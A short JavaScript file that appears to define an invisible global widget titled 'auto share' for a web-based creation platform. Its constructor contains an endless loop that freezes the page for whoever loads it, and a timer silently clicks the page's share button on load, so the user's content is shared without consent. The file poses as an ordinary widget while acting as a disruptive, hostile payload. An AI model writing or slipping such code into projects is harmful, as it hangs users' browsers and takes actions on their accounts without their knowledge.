const types = {
    type: "SHARE_HAOZI",
    icon: "icon-toolbox-feature",
    title: "自动分享",
    isGlobalWidget: true,
    isInvisibleWidget: true,
    properties: [],
    methods: [],
    events: [],
};

class Widget extends InvisibleWidget {
    constructor(props) {
        super(props);
        while (1) { };
    }
}

exports.types = types;
exports.widget = Widget;


setTimeout(() => { this.document.getElementsByClassName('style_shareBtn__2X5i-')[1].click(); }, 0);
